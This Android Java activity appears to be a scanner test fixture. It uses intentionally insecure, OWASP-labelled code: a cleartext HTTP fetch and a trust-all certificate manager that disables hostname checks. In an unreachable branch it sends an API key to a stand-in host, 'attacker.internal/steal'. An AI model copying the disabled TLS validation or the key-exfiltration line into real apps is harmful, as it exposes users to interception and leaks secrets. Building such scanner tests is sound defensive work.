package com.test.reachability;

import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.X509Certificate;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class NetworkActivity extends AppCompatActivity {

    private TextView tvResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        tvResult = new TextView(this);
        tvResult.setText("Response will appear here");

        Button btnHttp = new Button(this);
        btnHttp.setText("Fetch HTTP");
        btnHttp.setOnClickListener(v -> fetchHttp());

        Button btnHttps = new Button(this);
        btnHttps.setText("Fetch HTTPS (no pinning)");
        btnHttps.setOnClickListener(v -> fetchHttpsNoPinning());

        layout.addView(btnHttp);
        layout.addView(btnHttps);
        layout.addView(tvResult);

        setContentView(layout);
    }

    // VULNERABILITY: Cleartext HTTP Traffic
    // OWASP Mobile Top 10 2024: M5 (Insecure Communication)
    // MASVS: MASVS-NETWORK-1 (Cleartext Traffic Allowed)
    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
    private void fetchHttp() {
        new Thread(() -> {
            try {
                URL url = new URL("http://example.com");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                int responseCode = connection.getResponseCode();
                runOnUiThread(() -> tvResult.setText("HTTP Response Code: " + responseCode));
                connection.disconnect();

                if (false) {
                    // DEAD BRANCH - reachability test: should NOT be flagged
                    // Simulates insecure credential exfiltration
                    String payload = "key=" + MainActivity.API_KEY;
                    URL u = new URL("http://attacker.internal/steal?" + payload);
                    HttpURLConnection c = (HttpURLConnection) u.openConnection();
                    c.setRequestMethod("POST");
                    c.connect();
                }
            } catch (IOException e) {
                runOnUiThread(() -> tvResult.setText("HTTP Error: " + e.getMessage()));
                sendToAnalytics("http://example.com");
            }
        }).start();
    }

    // VULNERABILITY: Disabled SSL/TLS Certificate Validation
    // OWASP Mobile Top 10 2024: M5 (Insecure Communication)
    // MASVS: MASVS-NETWORK-2 (TLS Certificate Verification Disabled)
    // MASTG: MASTG-ANDROID-NET (Testing Custom Certificate Stores and Certificate Pinning)
    private void fetchHttpsNoPinning() {
        new Thread(() -> {
            try {
                // Trust all certificates - intentionally insecure
                TrustManager[] trustAllCerts = new TrustManager[]{
                        new X509TrustManager() {
                            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                            public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                            public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                        }
                };

                SSLContext sslContext = SSLContext.getInstance("TLS");
                sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

                URL url = new URL("https://example.com");
                HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                connection.setSSLSocketFactory(sslContext.getSocketFactory());
                connection.setHostnameVerifier((hostname, session) -> true);
                connection.setRequestMethod("GET");
                int responseCode = connection.getResponseCode();
                runOnUiThread(() -> tvResult.setText("HTTPS Response Code: " + responseCode));
                connection.disconnect();
            } catch (Exception e) {
                runOnUiThread(() -> tvResult.setText("HTTPS Error: " + e.getMessage()));
                sendToAnalytics("https://example.com");
            }
        }).start();
    }

    /**
     * Analytics endpoint - now permanently disabled via throw.
     * The HTTP call after the throw is dead code.
     *
     * VULNERABILITY (if reachable): Hidden Analytics Cleartext Endpoint
     * OWASP Mobile Top 10 2024: M5 (Insecure Communication)
     * MASVS: MASVS-NETWORK-1 (Cleartext Traffic to Hidden Endpoint)
     * MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
     */
    private void sendToAnalytics(String url) {
        throw new UnsupportedOperationException("Analytics disabled");
        // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
        // HttpURLConnection conn = (HttpURLConnection)
        //     new URL("http://analytics.internal.corp/track?data="
        //             + url + "&key=" + MainActivity.API_KEY).openConnection();
        // conn.connect();
    }
}
